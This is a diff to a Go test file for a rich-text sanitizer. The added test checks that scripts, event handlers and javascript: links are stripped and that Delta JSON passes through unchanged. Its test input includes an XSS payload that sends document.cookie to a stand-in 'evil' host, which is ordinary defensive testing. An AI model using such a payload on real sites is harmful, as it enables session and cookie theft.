@@ -1,6 +1,9 @@
 package richtext
 
-import "testing"
+import (
+	"strings"
+	"testing"
+)
 
 func TestPlainText(t *testing.T) {
 	cases := []struct {
@@ -42,5 +45,22 @@ func TestPlainText(t *testing.T) {
 				t.Errorf("got %q, want %q", got, tc.expected)
 			}
 		})
+	}
+}
+
+func TestCleanStripsScriptsButKeepsMarkupAndDeltas(t *testing.T) {
+	dirty := `<p>Deri <strong>kemer</strong></p><img src=x onerror="fetch('//evil/'+document.cookie)"><script>alert(1)</script><a href="javascript:alert(1)">x</a>`
+	clean := Clean(dirty)
+	for _, banned := range []string{"onerror", "<script", "javascript:"} {
+		if strings.Contains(clean, banned) {
+			t.Fatalf("Clean kept %q: %s", banned, clean)
+		}
+	}
+	if !strings.Contains(clean, "<strong>kemer</strong>") {
+		t.Fatalf("Clean dropped allowed markup: %s", clean)
+	}
+	delta := `{"ops":[{"insert":"<script>alert(1)</script>\n"}]}`
+	if got := Clean(delta); got != delta {
+		t.Fatalf("a Delta document must be stored unchanged (the renderer escapes inserts), got %s", got)
 	}
 }
